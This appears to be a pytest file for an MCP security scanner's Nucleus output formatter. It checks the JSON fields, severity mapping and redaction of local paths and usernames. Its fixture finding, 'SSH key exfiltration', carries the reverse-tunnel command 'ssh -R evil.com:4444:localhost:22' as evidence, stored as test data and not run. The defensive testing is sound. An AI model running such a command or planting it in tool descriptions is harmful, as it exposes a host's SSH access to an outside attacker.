@@ -1,0 +1,429 @@
+"""Tests for the Nucleus FlexConnect output formatter."""
+
+from __future__ import annotations
+
+import json
+from datetime import UTC, datetime
+from pathlib import Path
+
+import pytest
+
+from mcp_audit.models import Finding, ScanResult, Severity
+from mcp_audit.output.nucleus import format_nucleus
+
+_TEST_PREFIX = "test-host"
+
+# ── Helpers ────────────────────────────────────────────────────────────────────
+
+_FIXED_TS = datetime(2026, 4, 12, 14, 30, 0, tzinfo=UTC)
+
+
+def _make_finding(
+    *,
+    finding_id: str = "POISON-001",
+    severity: Severity = Severity.CRITICAL,
+    client: str = "cursor",
+    server: str = "filesystem-server",
+    title: str = "SSH key exfiltration",
+    description: str = "Tool description contains SSH exfiltration command.",
+    evidence: str = "ssh -R evil.com:4444:localhost:22",
+    remediation: str = "Remove the server from your configuration.",
+    cwe: str | None = "CWE-506",
+    finding_path: str | None = "/home/user/.cursor/mcp.json",
+) -> Finding:
+    return Finding(
+        id=finding_id,
+        severity=severity,
+        analyzer="poisoning",
+        client=client,
+        server=server,
+        title=title,
+        description=description,
+        evidence=evidence,
+        remediation=remediation,
+        cwe=cwe,
+        finding_path=finding_path,
+    )
+
+
+def _make_result(findings: list[Finding] | None = None) -> ScanResult:
+    result = ScanResult(
+        clients_scanned=1,
+        servers_found=2,
+        findings=findings or [],
+    )
+    # Pin timestamp for deterministic assertions.
+    result.timestamp = _FIXED_TS
+    return result
+
+
+def _parse(result: ScanResult, asset_prefix: str = _TEST_PREFIX) -> dict:
+    return json.loads(format_nucleus(result, asset_prefix=asset_prefix))
+
+
+# ── Top-level document structure ───────────────────────────────────────────────
+
+
+class TestDocumentStructure:
+    @pytest.fixture(autouse=True)
+    def _pro(self, pro_enabled: None) -> None:
+        """Activate the Pro gate for all nucleus formatter tests in this class."""
+
+    def test_returns_valid_json(self) -> None:
+        out = format_nucleus(_make_result())
+        parsed = json.loads(out)  # raises if invalid
+        assert isinstance(parsed, dict)
+
+    def test_nucleus_import_version(self) -> None:
+        doc = _parse(_make_result())
+        assert doc["nucleus_import_version"] == "1"
+
+    def test_scan_tool(self) -> None:
+        doc = _parse(_make_result())
+        assert doc["scan_tool"] == "mcp-audit"
+
+    def test_scan_type(self) -> None:
+        doc = _parse(_make_result())
+        assert doc["scan_type"] == "Host"
+
+    def test_scan_date_format(self) -> None:
+        doc = _parse(_make_result())
+        # FlexConnect expects "YYYY-MM-DD HH:MM:SS"
+        assert doc["scan_date"] == "2026-04-12 14:30:00"
+
+    def test_findings_key_present(self) -> None:
+        doc = _parse(_make_result())
+        assert "findings" in doc
+        assert isinstance(doc["findings"], list)
+
+    def test_empty_result_has_empty_findings(self) -> None:
+        doc = _parse(_make_result(findings=[]))
+        assert doc["findings"] == []
+
+    def test_required_top_level_keys_complete(self) -> None:
+        doc = _parse(_make_result())
+        required = {
+            "nucleus_import_version",
+            "scan_tool",
+            "scan_type",
+            "scan_date",
+            "assets",
+            "findings",
+        }
+        assert required.issubset(doc.keys())
+
+    def test_assets_array_has_one_entry(self) -> None:
+        doc = _parse(_make_result())
+        assert isinstance(doc["assets"], list)
+        assert len(doc["assets"]) == 1
+
+    def test_assets_entry_uses_asset_prefix(self) -> None:
+        doc = _parse(_make_result(), asset_prefix="my-laptop")
+        assert doc["assets"][0]["host_name"] == "my-laptop"
+
+    def test_assets_entry_includes_os(self) -> None:
+        doc = _parse(_make_result())
+        asset = doc["assets"][0]
+        assert "operating_system_name" in asset
+
+
+# ── Finding field mapping ──────────────────────────────────────────────────────
+
+
+class TestFindingMapping:
+    # setup_method cannot receive fixtures, so we use an autouse fixture instead.
+    # This guarantees pro_enabled (and its patches) are active before _parse runs.
+    @pytest.fixture(autouse=True)
+    def _setup(self, pro_enabled: None) -> None:
+        self.finding = _make_finding()
+        self.doc = _parse(_make_result(findings=[self.finding]))
+        self.row = self.doc["findings"][0]
+
+    def test_host_name_links_to_asset(self) -> None:
+        # Each finding must carry the same host_name as the assets[] entry
+        # so Nucleus can correlate finding → asset.
+        assert self.row["host_name"] == _TEST_PREFIX
+
+    def test_finding_number_is_dedup_key(self) -> None:
+        assert self.row["finding_number"] == "POISON-001"
+
+    def test_finding_name(self) -> None:
+        assert self.row["finding_name"] == "SSH key exfiltration"
+
+    def test_finding_description(self) -> None:
+        assert self.row["finding_description"] == (
+            "Tool description contains SSH exfiltration command."
+        )
+
+    def test_finding_solution(self) -> None:
+        assert self.row["finding_solution"] == (
+            "Remove the server from your configuration."
+        )
+
+    def test_finding_output(self) -> None:
+        assert self.row["finding_output"] == "ssh -R evil.com:4444:localhost:22"
+
+    def test_finding_path_no_longer_the_raw_absolute_path(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """Nucleus is an external system this document is uploaded to, so the
+        raw absolute path (and the username it would carry under $HOME) must
+        not survive verbatim. See TestLocalPathRedaction below for the
+        home-directory-anchored redaction behaviour.
+
+        Uses a real, host-native `Path` (rather than a hardcoded POSIX-style
+        literal) so this passes on Windows too: a forward-slash string isn't
+        a Windows path, so `str(Path(...))` of it never matches the original
+        text and the redaction would appear to no-op for the wrong reason.
+        """
+        home = tmp_path / "home" / "user"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = home / ".cursor" / "mcp.json"
+
+        finding = _make_finding(finding_path=str(config_path))
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert row["finding_path"] != str(config_path)
+        assert "mcp.json" in row["finding_path"]
+
+    def test_finding_result_always_fail(self) -> None:
+        assert self.row["finding_result"] == "Fail"
+
+    def test_finding_type_always_vulnerability(self) -> None:
+        assert self.row["finding_type"] == "Vulnerability"
+
+    def test_finding_cve_populated_from_cwe(self) -> None:
+        assert self.row["finding_cve"] == "CWE-506"
+
+    def test_finding_cve_omitted_when_no_cwe(self) -> None:
+        finding = _make_finding(cwe=None)
+        doc = _parse(_make_result(findings=[finding]))
+        assert "finding_cve" not in doc["findings"][0]
+
+    def test_finding_path_empty_string_when_none(self) -> None:
+        finding = _make_finding(finding_path=None)
+        doc = _parse(_make_result(findings=[finding]))
+        assert doc["findings"][0]["finding_path"] == ""
+
+
+# ── Severity mapping ───────────────────────────────────────────────────────────
+
+
+class TestSeverityMapping:
+    @pytest.fixture(autouse=True)
+    def _pro(self, pro_enabled: None) -> None:
+        """Activate the Pro gate for severity-mapping tests."""
+
+    @pytest.mark.parametrize(
+        "severity,expected",
+        [
+            (Severity.CRITICAL, "Critical"),
+            (Severity.HIGH, "High"),
+            (Severity.MEDIUM, "Medium"),
+            (Severity.LOW, "Low"),
+            (Severity.INFO, "Informational"),
+        ],
+    )
+    def test_severity_values(self, severity: Severity, expected: str) -> None:
+        finding = _make_finding(severity=severity)
+        doc = _parse(_make_result(findings=[finding]))
+        assert doc["findings"][0]["finding_severity"] == expected
+
+
+# ── Multiple findings ──────────────────────────────────────────────────────────
+
+
+class TestMultipleFindings:
+    @pytest.fixture(autouse=True)
+    def _pro(self, pro_enabled: None) -> None:
+        """Activate the Pro gate for multi-finding tests."""
+
+    def test_finding_count_matches(self) -> None:
+        findings = [
+            _make_finding(finding_id="POISON-001", server="evil-calc"),
+            _make_finding(
+                finding_id="CRED-001", server="github", severity=Severity.HIGH
+            ),
+            _make_finding(
+                finding_id="TRANSPORT-001", server="sus-api", severity=Severity.MEDIUM
+            ),
+        ]
+        doc = _parse(_make_result(findings=findings))
+        assert len(doc["findings"]) == 3
+
+    def test_each_finding_has_unique_dedup_key(self) -> None:
+        findings = [
+            _make_finding(finding_id="POISON-001"),
+            _make_finding(finding_id="CRED-001"),
+        ]
+        doc = _parse(_make_result(findings=findings))
+        numbers = [f["finding_number"] for f in doc["findings"]]
+        assert len(set(numbers)) == len(numbers)
+
+    def test_finding_order_preserved(self) -> None:
+        ids = ["SC-001", "TRANSPORT-003", "CRED-002"]
+        findings = [_make_finding(finding_id=fid) for fid in ids]
+        doc = _parse(_make_result(findings=findings))
+        assert [f["finding_number"] for f in doc["findings"]] == ids
+
+    def test_all_findings_share_host_name(self) -> None:
+        # All findings from one scan point to the same host asset.
+        findings = [
+            _make_finding(client="claude", server="fs"),
+            _make_finding(client="cursor", server="gh", finding_id="CRED-001"),
+        ]
+        doc = _parse(_make_result(findings=findings))
+        host_names = {f["host_name"] for f in doc["findings"]}
+        assert host_names == {_TEST_PREFIX}
+
+
+# ── Output is pretty-printed JSON ─────────────────────────────────────────────
+
+
+class TestOutputFormat:
+    @pytest.fixture(autouse=True)
+    def _pro(self, pro_enabled: None) -> None:
+        """Activate the Pro gate for output-format tests."""
+
+    def test_output_is_indented(self) -> None:
+        out = format_nucleus(_make_result(findings=[_make_finding()]))
+        # Pretty-printed JSON has newlines and indentation
+        assert "\n" in out
+        assert "  " in out
+
+    def test_output_is_string(self) -> None:
+        assert isinstance(format_nucleus(_make_result()), str)
+
+
+# ── scanner.py integration: finding_path is backfilled ────────────────────────
+
+
+class TestFindingPathBackfill:
+    """Verify that the Finding model accepts and stores finding_path."""
+
+    def test_finding_path_field_exists(self) -> None:
+        f = _make_finding(finding_path="/some/path/mcp.json")
+        assert f.finding_path == "/some/path/mcp.json"
+
+    def test_finding_path_defaults_none(self) -> None:
+        f = Finding(
+            id="X-001",
+            severity=Severity.LOW,
+            analyzer="test",
+            client="claude",
+            server="srv",
+            title="t",
+            description="d",
+            evidence="e",
+            remediation="r",
+        )
+        assert f.finding_path is None
+
+    def test_finding_path_survives_round_trip(self) -> None:
+        f = _make_finding(finding_path="/Users/me/.cursor/mcp.json")
+        dumped = f.model_dump()
+        restored = Finding(**dumped)
+        assert restored.finding_path == "/Users/me/.cursor/mcp.json"
+
+
+# ── Local path redaction ──────────────────────────────────────────────────────
+
+
+class TestLocalPathRedaction:
+    """Nucleus FlexConnect JSON is uploaded to an external security platform —
+    the same "leaves the machine" category as the advisory feed (PR #46) and
+    SARIF output. Every text field, and finding_path itself, must not carry
+    this host's own scanned-config path or the operator's $HOME-derived
+    username off the machine.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _pro(self, pro_enabled: None) -> None:
+        """Activate the Pro gate for local-path-redaction tests."""
+
+    def test_cfhyg_style_remediation_is_redacted(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "home"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = cwd / "project" / "mcp.json"
+        config_path.parent.mkdir(parents=True)
+
+        finding = _make_finding(
+            finding_id="CFHYG-001",
+            remediation=f"Run: chmod 600 {config_path}",
+            finding_path=str(config_path),
+        )
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert str(config_path) not in row["finding_solution"]
+        assert str(Path("project") / "mcp.json") in row["finding_solution"]
+
+    def test_finding_path_field_is_redacted(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "home"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = cwd / "project" / "mcp.json"
+        config_path.parent.mkdir(parents=True)
+
+        finding = _make_finding(finding_path=str(config_path))
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert row["finding_path"] == str(Path("project") / "mcp.json")
+
+    def test_no_username_leaks_when_cwd_is_a_sibling_of_home(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "users" / "someusername"
+        home.mkdir(parents=True)
+        cwd = tmp_path / "checkouts" / "mcp-audit"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = home / "Library" / "mcp.json"
+        config_path.parent.mkdir(parents=True)
+
+        finding = _make_finding(
+            finding_id="CFHYG-001",
+            remediation=f"Run: chmod 600 {config_path}",
+            finding_path=str(config_path),
+        )
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert "someusername" not in json.dumps(row)
+
+    def test_content_unrelated_to_the_config_path_is_untouched(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        home = tmp_path / "home"
+        cwd = home / "checkout"
+        cwd.mkdir(parents=True)
+        monkeypatch.setattr(Path, "home", lambda: home)
+        monkeypatch.chdir(cwd)
+        config_path = cwd / "mcp.json"
+
+        finding = _make_finding(
+            finding_id="TRANSPORT-003",
+            description=(
+                "Command: npx -y @modelcontextprotocol/server-filesystem /Users/shared"
+            ),
+            finding_path=str(config_path),
+        )
+        doc = _parse(_make_result(findings=[finding]))
+        row = doc["findings"][0]
+
+        assert "/Users/shared" in row["finding_description"]
